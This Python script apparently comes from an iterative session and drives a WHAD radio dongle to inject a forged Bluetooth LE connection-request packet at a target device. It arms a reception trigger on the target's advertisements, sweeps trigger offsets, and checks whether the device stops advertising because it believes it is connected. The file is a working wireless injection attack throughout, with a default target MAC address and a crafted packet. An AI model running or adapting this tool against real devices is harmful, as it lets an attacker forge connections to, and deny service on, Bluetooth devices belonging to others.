#!/usr/bin/env python3
# v8 - sanity-check trigger machinery, sweep AdvA offsets, then watch acceptance
import argparse, time, threading, sys

def _parse_args():
    p = argparse.ArgumentParser(description="Calibrate hardware triggers: sanity check + AdvA offset sweep + acceptance watch.")
    p.add_argument("mac", nargs="?", default="C0:00:00:41:73:AC", help="target MAC (default: %(default)s)")
    p.add_argument("--scan-time", type=int, default=25, help="phase-1 scan window seconds (default: %(default)s)")
    p.add_argument("--offsets", default="0-30", help="offset range to sweep, e.g. 0-30 (default: %(default)s)")
    p.add_argument("--port", default="uart0", help="WHAD dongle port (default: %(default)s)")
    return p.parse_args()

ARGS = _parse_args()

TARGET     = ARGS.mac
TARGET_KEY = TARGET.replace(":", "").upper()
ADVA_WIRE  = bytes.fromhex(TARGET_KEY)[::-1]
PDU_HEX    = "8522AABBCCDDEEFFAC73410000C0A1B2C3D412345602000018000000C800FFFFFFFF1F2D"
RAW        = bytes.fromhex(PDU_HEX)
SCAN_TIME  = ARGS.scan_time
if "-" in ARGS.offsets:
    _o0, _o1 = ARGS.offsets.split("-", 1)
    OFFSETS = range(int(_o0), int(_o1) + 1)
else:
    OFFSETS = [int(x) for x in ARGS.offsets.split(",")]
T0 = time.time()
def ts(): return f"{time.time()-T0:6.2f}s"
def log(m): print(f"[{ts()}] {m}", flush=True)

from whad.device import WhadDevice
from whad.ble.connector import Injector
from whad.common.triggers import ReceptionTrigger
from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV_IND
PKT = BTLE(bytes.fromhex("D6BE898E") + RAW)
assert bytes(PKT)[4:] == RAW, "round-trip mismatch"
FIRE = threading.Event()

def open_injector(mode="scan"):
    for i in range(5):
        try:
            d = WhadDevice.create(ARGS.port); ij = Injector(d)
            try:
                if mode == "scan": ij.enable_scan_mode()
                else: ij.sniff_advertisements()
            except Exception as e: log(f"  mode: {type(e).__name__}: {e}")
            try: ij.start()
            except Exception: pass
            return d, ij
        except Exception as e:
            log(f"  reopen retry {i+1}/5: {type(e).__name__}: {e}"); time.sleep(1)
    return None, None

def make_counter(ij):
    c = {"n": 0}
    orig = ij.on_adv_pdu
    def hook(pkt, *a, **k):
        try:
            if ADVA_WIRE in bytes(pkt): c["n"] += 1
        except Exception: pass
        try: return orig(pkt, *a, **k)
        except Exception: pass
    ij.on_adv_pdu = hook
    return c

def arm(ij, trig):
    FIRE.clear()
    ij.prepare(PKT, trigger=trig); ij.trigger(trig)
    o  = getattr(trig, "trigger", None)
    ot = ij.on_triggered
    def say():
        if not FIRE.is_set():
            FIRE.set(); log(">>> FIRE - YOUR 36 BYTES WERE TRANSMITTED ON-AIR <<<")
    def h(*a, **k):
        say()
        try: return o(*a, **k) if callable(o) else None
        except Exception: return None
    def ht(*a, **k):
        say()
        try: return ot(*a, **k)
        except Exception: pass
    trig.trigger = h; ij.on_triggered = ht

def watch(ij, cnt, secs, gap=False):
    t0 = time.time(); last = time.time(); prev = 0
    last_adv = gap_start = dur = None
    while time.time() - t0 < secs:
        if cnt["n"] > prev: prev = cnt["n"]; last_adv = time.time()
        if gap and FIRE.is_set() and last_adv and time.time()-last_adv > 2.4 and gap_start is None:
            gap_start = last_adv
            log(">>> ACCEPTED - device STOPPED advertising (believes it is CONNECTED) <<<")
        if gap and gap_start and last_adv and last_adv-gap_start > 1.0 and dur is None:
            dur = last_adv - gap_start
            log(f"<<< resumed advertising - connection lasted ~{dur:.2f}s (your timeout field = 2.00s) <<<")
        if time.time() - last >= 3:
            last = time.time()
            log(f"   ... ADVs:{cnt['n']:>3}  {'FIRED' if FIRE.is_set() else 'waiting'}")
        time.sleep(0.05)
    return FIRE.is_set(), dur

# ================= PHASE 1: confirm target =================
log(f"PHASE 1 - confirming {TARGET} is advertising")
d, ij = open_injector()
if not ij: sys.exit(1)
cnt = make_counter(ij)
t0 = time.time()
while time.time()-t0 < SCAN_TIME and cnt["n"] == 0: time.sleep(0.1)
if cnt["n"] == 0:
    log("NOT FOUND - not advertising. Pairing mode / disconnect phone, re-run."); sys.exit(2)
time.sleep(2)
log(f"OK - target advertising ({cnt['n']} ADVs heard)")

# ================= PHASE 2: sanity (mask=0 matches ANY packet) =================
log("PHASE 2 - SANITY: mask-0 trigger must fire on ANY packet")
arm(ij, ReceptionTrigger(pattern=b"\x00", mask=b"\x00", offset=0))
ok, _ = watch(ij, cnt, 6)
try: d.close()
except Exception: pass
if not ok:
    log("sanity failed in scan mode - trying sniff_advertisements() mode")
    d, ij = open_injector(mode="sniff")
    if ij:
        cnt = make_counter(ij)
        arm(ij, ReceptionTrigger(pattern=b"\x00", mask=b"\x00", offset=0))
        ok, _ = watch(ij, cnt, 6)
        try: d.close()
        except Exception: pass
if not ok:
    log("SANITY FAILED - trigger machinery never fires at all.")
    log("Paste me the output of:  grep -n \"def prepare\" -A 30 inject_api.txt | head -45")
    sys.exit(3)
log("SANITY PASS - machinery works; now find the matching offset")

# ================= PHASE 3: offset sweep 0..30 =================
log(f"PHASE 3 - sweeping AdvA pattern across offsets {list(OFFSETS)[0]}..{list(OFFSETS)[-1]} (3.5s each)")
matched, possibles = [], []
for off in OFFSETS:
    d, ij = open_injector()
    if not ij: break
    cnt = make_counter(ij)
    arm(ij, ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=off))
    fired, _ = watch(ij, cnt, 3.5)
    tag = "FIRED" if fired else "-"
    if cnt["n"] == 0 and not fired: tag += "  (no ADVs!)"
    log(f"  offset {off:>2}: {tag}")
    if fired: matched.append(off)
    elif cnt["n"] == 0: possibles.append(off)
    try: d.close()
    except Exception: pass

log("="*62)
log(f"MATCHED OFFSETS : {matched if matched else 'none'}")
if possibles: log(f"ADVs vanished at offsets (possible silent acceptance): {possibles}")
log("="*62)

# ================= PHASE 4: acceptance watch on best offset =================
best = matched[0] if matched else (possibles[0] if possibles else None)
if best is not None:
    log(f"PHASE 4 - ACCEPTANCE WATCH: offset {best}, 20s (phone: MDT2410161 should VANISH)")
    d, ij = open_injector()
    cnt = make_counter(ij)
    arm(ij, ReceptionTrigger(pattern=ADVA_WIRE, mask=b"\xff"*6, offset=best))
    fired, dur = watch(ij, cnt, 20, gap=True)
    try: d.close()
    except Exception: pass
    log("="*62)
    if fired and dur:
        log(f"VERDICT: SENT (offset {best}) + ACCEPTED + connection lived ~{dur:.2f}s"
            + ("  == your 2.00s timeout field! DEMO COMPLETE" if abs(dur-2.0) <= 0.8 else ""))
    elif fired:
        log(f"VERDICT: SENT (offset {best}) but device kept advertising -> rejected/ignored the CONNECT_IND")
    elif cnt["n"] == 0:
        log("VERDICT: device went silent without FIRE event -> check phone: did it vanish?")
    else:
        log("VERDICT: no fire this window")
    log("="*62)
else:
    log("No offset matched anywhere. Paste: grep -n \"def prepare\" -A 30 inject_api.txt | head -45")
